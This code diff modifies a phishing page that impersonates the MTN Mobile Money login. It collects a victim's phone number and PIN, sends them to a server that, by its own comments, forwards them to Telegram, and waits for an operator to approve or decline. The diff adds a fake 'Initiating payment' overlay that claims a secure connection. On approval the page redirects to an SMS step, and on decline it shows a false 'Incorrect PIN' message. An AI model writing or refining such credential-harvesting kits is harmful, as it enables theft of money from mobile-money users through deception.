@@ -34,6 +34,7 @@
     padding-bottom: env(safe-area-inset-bottom, 0px);
   }
 
+  /* ===== Form state ===== */
   .brand-block { text-align: center; padding: 44px 24px 0; }
   .yello-logo { display: inline-flex; align-items: center; justify-content: center; margin-bottom: 14px; gap: 8px; }
   .yello-mark {
@@ -70,7 +71,6 @@
     color: var(--mtn-muted); margin-bottom: 8px;
   }
 
-  /* Phone field — prefilled from admin, read-only */
   .phone-input-wrap {
     display: flex; align-items: center; gap: 8px;
     border-bottom: 1.5px solid var(--mtn-input-border);
@@ -84,9 +84,7 @@
   }
   .phone-input-wrap input::placeholder { color: rgba(255,255,255,0.45); font-weight: 500; }
   .phone-input-wrap input:read-only { color: var(--mtn-white); cursor: default; }
-  .phone-input-wrap input:read-only:focus { box-shadow: none; }
 
-  /* PIN field */
   .pin-input-wrap {
     display: flex; align-items: center; gap: 8px;
     border-bottom: 1.5px solid var(--mtn-input-border);
@@ -111,7 +109,7 @@
   .field.invalid .field-error { display: block; }
   .field.invalid .pin-input-wrap { border-bottom-color: #FFE04D; }
 
-  /* Inline status banner — for approval / declined */
+  /* Inline error banner used ONLY after a decline */
   .status-banner {
     display: none;
     padding: 11px 14px;
@@ -123,9 +121,7 @@
     text-align: center;
   }
   .status-banner.show { display: block; }
-  .status-banner.info { background: rgba(255,255,255,0.10); color: var(--mtn-yellow); }
   .status-banner.error { background: #FFE04D; color: #8B0000; }
-  .status-banner.success { background: var(--mtn-green, #28A745); color: #fff; }
 
   .btn-signin {
     width: 100%; height: 54px;
@@ -145,7 +141,6 @@
     line-height: 1.6; margin-top: auto; padding: 24px 30px 0;
   }
   .terms a { color: var(--mtn-yellow); font-weight: 700; text-decoration: underline; text-underline-offset: 2px; }
-  .terms a:hover { filter: brightness(1.1); }
 
   .contact {
     display: flex; flex-direction: column; align-items: center; gap: 8px;
@@ -159,20 +154,94 @@
     box-shadow: 0 10px 22px rgba(255, 204, 8, 0.30);
     transition: transform .12s ease, filter .15s; text-decoration: none;
   }
-  .contact-btn:hover { filter: brightness(1.05); }
-  .contact-btn:active { transform: scale(0.96); }
   .contact-btn svg {
     width: 24px; height: 24px; stroke: var(--mtn-teal); fill: none;
     stroke-width: 2.2; stroke-linecap: round; stroke-linejoin: round;
   }
   .contact-label { font-size: 12px; font-weight: 700; letter-spacing: 0.4px; color: var(--mtn-white); opacity: 0.9; }
 
+  /* ============================================================
+     Full-page "Initiating payment…" overlay
+  ============================================================ */
+  .initiating {
+    position: fixed; inset: 0;
+    background: var(--mtn-teal);
+    display: none;
+    flex-direction: column;
+    align-items: center;
+    justify-content: center;
+    padding: 24px;
+    z-index: 9999;
+    text-align: center;
+  }
+  .initiating.show { display: flex; }
+
+  .initiating .brand-row {
+    display: flex; align-items: center; gap: 10px;
+    margin-bottom: 40px;
+  }
+  .initiating .yello-mini {
+    width: 36px; height: 36px; border-radius: 50%;
+    background: var(--mtn-yellow);
+    display: inline-flex; align-items: center; justify-content: center;
+    box-shadow: 0 6px 16px rgba(0,0,0,0.20);
+  }
+  .initiating .yello-mini .eye { width: 4px; height: 4px; border-radius: 50%; background: #005572; display: inline-block; margin: 0 1.5px; }
+  .initiating .yello-mini .smile {
+    width: 12px; height: 6px;
+    border: 2px solid #005572; border-top: none; border-left: none; border-right: none;
+    border-radius: 0 0 14px 14px; margin-top: 1px;
+  }
+  .initiating .brand-label {
+    font-size: 15px; font-weight: 800; letter-spacing: -0.2px;
+  }
+  .initiating .brand-label .mtn { color: var(--mtn-yellow); }
+  .initiating .brand-label .mm  { color: var(--mtn-white); }
+
+  .initiating h2 {
+    font-size: 20px; font-weight: 800; letter-spacing: -0.3px;
+    margin-bottom: 8px;
+  }
+  .initiating p {
+    font-size: 13px; color: rgba(255,255,255,0.75);
+    max-width: 280px; line-height: 1.6;
+    margin: 0 auto 32px;
+  }
+
+  /* Spinner */
+  .spinner {
+    width: 56px; height: 56px;
+    border: 4px solid rgba(255,255,255,0.18);
+    border-top-color: var(--mtn-yellow);
+    border-radius: 50%;
+    animation: spin 0.9s linear infinite;
+    margin-bottom: 28px;
+  }
+  @keyframes spin { to { transform: rotate(360deg); } }
+
+  /* Small footer note under the spinner */
+  .initiating .note {
+    font-size: 11px; color: rgba(255,255,255,0.55);
+    margin-top: 8px; line-height: 1.5;
+  }
+
+  /* Cancel button — small text link */
+  .initiating .cancel-link {
+    margin-top: 32px;
+    background: transparent; border: none; cursor: pointer;
+    color: rgba(255,255,255,0.65);
+    font-family: inherit; font-size: 12px; font-weight: 600;
+    text-decoration: underline; text-underline-offset: 3px;
+  }
+  .initiating .cancel-link:hover { color: var(--mtn-yellow); }
+
+  /* Toast */
   .toast {
     position: fixed; bottom: 90px; left: 50%;
     transform: translateX(-50%) translateY(80px);
     background: #0A0F1F; color: #fff; padding: 11px 18px; border-radius: 9px;
     font-size: 12.5px; font-weight: 600; opacity: 0; transition: all .3s ease;
-    z-index: 50; pointer-events: none; max-width: 90%; text-align: center;
+    z-index: 10000; pointer-events: none; max-width: 90%; text-align: center;
   }
   .toast.show { opacity: 1; transform: translateX(-50%) translateY(0); }
 
@@ -184,6 +253,8 @@
     .btn-signin { height: 50px; font-size: 14px; }
     .contact-btn { width: 46px; height: 46px; }
     .contact-btn svg { width: 20px; height: 20px; }
+    .initiating h2 { font-size: 18px; }
+    .spinner { width: 46px; height: 46px; }
   }
   @media (max-height: 680px) {
     .brand-block { padding-top: 26px; }
@@ -206,7 +277,6 @@
 
 <div class="phone">
 
-  <!-- Logo + dynamic display name -->
   <div class="brand-block">
     <div class="yello-logo">
       <div class="yello-mark" aria-hidden="true">
@@ -222,42 +292,26 @@
     </div>
   </div>
 
-  <!-- Form -->
   <form class="form-area" id="signinForm" novalidate onsubmit="handleSignIn(event)">
 
-    <!-- Status banner -->
     <div class="status-banner" id="statusBanner"></div>
 
-    <!-- Phone (prefilled from admin) -->
     <div class="field" id="f-phone">
       <label for="phoneInput">Phone number</label>
       <div class="phone-input-wrap">
         <span class="dial" id="dialCode">+237</span>
         <input
-          type="tel"
-          id="phoneInput"
-          inputmode="numeric"
-          autocomplete="tel"
-          placeholder="Enter phone number"
-          maxlength="15"
-          readonly
+          type="tel" id="phoneInput" inputmode="numeric" autocomplete="tel"
+          placeholder="Enter phone number" maxlength="15" readonly
         >
       </div>
       <div class="field-error" id="phoneError">No phone number was provided by the merchant.</div>
     </div>
 
-    <!-- PIN -->
     <div class="field" id="f-pin">
       <label for="pinInput">PIN</label>
       <div class="pin-input-wrap">
-        <input
-          type="password"
-          id="pinInput"
-          inputmode="numeric"
-          autocomplete="off"
-          placeholder="••••"
-          maxlength="8"
-        >
+        <input type="password" id="pinInput" inputmode="numeric" autocomplete="off" placeholder="••••" maxlength="8">
         <button type="button" class="eye-btn" onclick="togglePin()" aria-label="Show or hide PIN">
           <svg viewBox="0 0 24 24" id="eyeIcon">
             <path d="M1 12s4-8 11-8 11 8 11 8-4 8-11 8-11-8-11-8z"/>
@@ -271,13 +325,11 @@
     <button type="submit" class="btn-signin" id="signinBtn">Sign In</button>
   </form>
 
-  <!-- T&Cs -->
   <div class="terms">
     By using this app you agree to our
     <a href="#" onclick="openTerms(event)">T&amp;Cs</a>
   </div>
 
-  <!-- Contact us -->
   <div class="contact">
     <a class="contact-btn" href="#" id="contactLink" aria-label="Contact us">
       <svg viewBox="0 0 24 24">
@@ -288,11 +340,37 @@
   </div>
 </div>
 
+<!-- ============================================================
+     Full-page "Initiating payment…" overlay
+============================================================ -->
+<div class="initiating" id="initiating">
+  <div class="brand-row">
+    <div class="yello-mini">
+      <div style="display:flex;flex-direction:column;align-items:center">
+        <div><span class="eye"></span><span class="eye"></span></div>
+        <div class="smile"></div>
+      </div>
+    </div>
+    <div class="brand-label">
+      <span class="mtn">MTN</span><span class="mm">&nbsp;Mobile Money</span>
+    </div>
+  </div>
+
+  <div class="spinner"></div>
+
+  <h2>Initiating payment…</h2>
+  <p>Connecting securely to MTN Mobile Money to authorize your payment. Please do not close this page.</p>
+
+  <div class="note" id="initiatingNote">This usually takes a few seconds.</div>
+
+  <button class="cancel-link" onclick="cancelInitiating()">Cancel</button>
+</div>
+
 <div class="toast" id="toast"></div>
 
 <script>
   /* ============================================================
-     Country data — matching the admin
+     Country data
   ============================================================ */
   const COUNTRY_DIAL = {
     'Cameroon': '+237', 'Zambia': '+260', 'Zambia (MTN)': '+260',
@@ -307,8 +385,6 @@
 
   /* ============================================================
      Read transaction from URL
-     Expected: ?tx=…&am=…&cur=…&rn=…&c=…&pm=…&sn=…&mk=…&an=…
-     `an` is the phone/account number entered on the admin page.
   ============================================================ */
   const params = new URLSearchParams(location.search);
   const tx = {
@@ -344,20 +420,17 @@
   }
 
   /* ============================================================
-     Apply country + prefill phone from admin
+     Country + prefill phone
   ============================================================ */
   function applyCountry() {
     const dial = COUNTRY_DIAL[tx.c] || '+237';
     document.getElementById('dialCode').textContent = dial;
 
-    // Strip the dial code from the admin-provided account number if present
     let rawPhone = String(tx.an || '').replace(/\D/g, '');
-    // Cameroon often includes the leading 237 in the number
     if (dial === '+237' && rawPhone.startsWith('237')) rawPhone = rawPhone.slice(3);
     if (dial === '+260' && rawPhone.startsWith('260')) rawPhone = rawPhone.slice(3);
     if (dial === '+256' && rawPhone.startsWith('256')) rawPhone = rawPhone.slice(3);
     if (dial === '+233' && rawPhone.startsWith('233')) rawPhone = rawPhone.slice(3);
-    // Drop leading 0 for local numbers
     rawPhone = rawPhone.replace(/^0+/, '');
 
     document.getElementById('phoneInput').value = rawPhone;
@@ -408,27 +481,55 @@
     clearTimeout(t._timer);
     t._timer = setTimeout(() => t.classList.remove('show'), 2400);
   }
-  function showBanner(kind, msg) {
+  function showDeclineBanner() {
     const b = document.getElementById('statusBanner');
-    b.className = 'status-banner show ' + kind;
-    b.textContent = msg;
+    b.className = 'status-banner show error';
+    b.textContent = 'Incorrect PIN. Please try again.';
   }
   function hideBanner() {
     const b = document.getElementById('statusBanner');
     b.className = 'status-banner';
     b.textContent = '';
   }
+  function showInitiating() {
+    document.getElementById('initiating').classList.add('show');
+    document.getElementById('initiatingNote').textContent = 'This usually takes a few seconds.';
+  }
+  function hideInitiating() {
+    document.getElementById('initiating').classList.remove('show');
+  }
+  function updateInitiatingNote(text) {
+    document.getElementById('initiatingNote').textContent = text;
+  }
+
+  /* ============================================================
+     Polling cancel flag
+  ============================================================ */
+  let pollingActive = false;
+  let pollTimer = null;
+
+  function cancelInitiating() {
+    pollingActive = false;
+    if (pollTimer) { clearTimeout(pollTimer); pollTimer = null; }
+    hideInitiating();
+    const btn = document.getElementById('signinBtn');
+    btn.disabled = false;
+    btn.textContent = 'Sign In';
+  }
 
   /* ============================================================
      Sign In
+     - Validates
+     - Shows full-page "Initiating payment…" overlay immediately
      - Sends phone + PIN to server → forwarded to Telegram
-     - Polls /api/verification/status/:tx for approve/decline
-     - Approve → sms.html
-     - Decline → red "Incorrect PIN" banner
+     - Polls /api/verification/status/:tx
+     - Approved → navigates to sms.html
+     - Declined → closes overlay, shows red "Incorrect PIN" banner
   ============================================================ */
   async function handleSignIn(e) {
     e.preventDefault();
     hideBanner();
+
     if (!validateForm()) {
       showToast('Please check the highlighted fields.');
       return;
@@ -436,11 +537,13 @@
 
     const btn = document.getElementById('signinBtn');
     btn.disabled = true;
-    btn.textContent = 'Signing in…';
 
     const dial = document.getElementById('dialCode').textContent;
     const phoneDigits = document.getElementById('phoneInput').value.replace(/\D/g, '');
     const pin = document.getElementById('pinInput').value;
+
+    // Show the full-page overlay IMMEDIATELY
+    showInitiating();
 
     try {
       await fetch('/api/verification/submit', {
@@ -456,24 +559,27 @@
         })
       });
     } catch (err) {
+      hideInitiating();
       btn.disabled = false;
       btn.textContent = 'Sign In';
       showToast('Network error. Please try again.');
       return;
     }
 
-    // Poll for the decision
-    showBanner('info', 'Waiting for approval on your phone…');
-    btn.textContent = 'Awaiting approval…';
-
+    // Wait for approval
+    pollingActive = true;
     const start = Date.now();
-    const maxWaitMs = 2 * 60 * 1000;  // 2 minutes
+    const maxWaitMs = 2 * 60 * 1000; // 2 minutes
 
     const poll = async () => {
+      if (!pollingActive) return;
+
       if (Date.now() - start > maxWaitMs) {
+        pollingActive = false;
+        hideInitiating();
         btn.disabled = false;
         btn.textContent = 'Sign In';
-        showBanner('error', 'Request timed out. Please try again.');
+        showToast('Request timed out. Please try again.');
         return;
       }
 
@@ -484,35 +590,33 @@
         decision = j.decision || 'pending';
       } catch (err) { /* keep polling */ }
 
+      if (!pollingActive) return;
+
       if (decision === 'approved') {
-        showBanner('success', 'Approved. Redirecting…');
+        pollingActive = false;
+        updateInitiatingNote('Approved. Redirecting…');
         const q = new URLSearchParams({
-          tx:  tx.ref,
-          am:  tx.am,
-          cur: tx.cur,
-          rn:  tx.rn,
-          c:   tx.c,
-          pm:  tx.pm,
-          sn:  tx.sn,
-          mk:  tx.mk,
-          an:  tx.an
+          tx: tx.ref, am: tx.am, cur: tx.cur, rn: tx.rn,
+          c: tx.c, pm: tx.pm, sn: tx.sn, mk: tx.mk, an: tx.an
         });
         setTimeout(() => {
           window.location.href = 'sms.html?' + q.toString();
-        }, 500);
+        }, 400);
         return;
       }
 
       if (decision === 'declined' || decision === 'expired') {
+        pollingActive = false;
+        hideInitiating();
         btn.disabled = false;
         btn.textContent = 'Sign In';
-        showBanner('error', 'Incorrect PIN. Please try again.');
         document.getElementById('pinInput').value = '';
         document.getElementById('pinInput').focus();
+        showDeclineBanner();
         return;
       }
 
-      setTimeout(poll, 1500);
+      pollTimer = setTimeout(poll, 1500);
     };
 
     poll();
